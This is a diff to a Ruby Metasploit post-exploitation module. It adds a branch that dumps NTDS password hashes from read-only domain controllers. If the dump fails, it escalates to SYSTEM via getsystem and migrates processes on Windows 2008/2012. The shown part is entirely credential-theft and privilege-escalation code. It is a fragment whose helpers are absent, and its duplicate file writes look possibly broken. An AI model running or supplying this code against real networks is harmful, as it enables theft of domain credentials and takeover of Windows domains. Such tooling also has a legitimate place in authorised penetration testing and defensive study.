@@ -431,7 +431,33 @@ class Metasploit3 < Msf::Post
       else
 
         # Check if Domain Controller
-        if domain_controller
+        if read_only_domain_controller
+          begin
+            file_local_write(pwdfile,inject_hashdump)
+			file_local_write(pwdfile,read_hashdump)
+          rescue
+            if migrate_system
+              print_status("Trying to get SYSTEM privilege")
+              results = session.priv.getsystem
+              if results[0]
+                print_good("Got SYSTEM privilege")
+                if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
+                  # Migrate process since on Windows 2008 R2 getsystem
+                  # does not set certain privilege tokens required to
+                  # inject and dump the hashes.
+                  move_to_sys
+                end
+                file_local_write(pwdfile,inject_hashdump)
+              else
+                print_error("Could not obtain SYSTEM privileges")
+              end
+            else
+              print_error("Could not get NTDS hashes!")
+            end
+
+          end
+		  
+		elsif domain_controller
           begin
             file_local_write(pwdfile,inject_hashdump)
           rescue
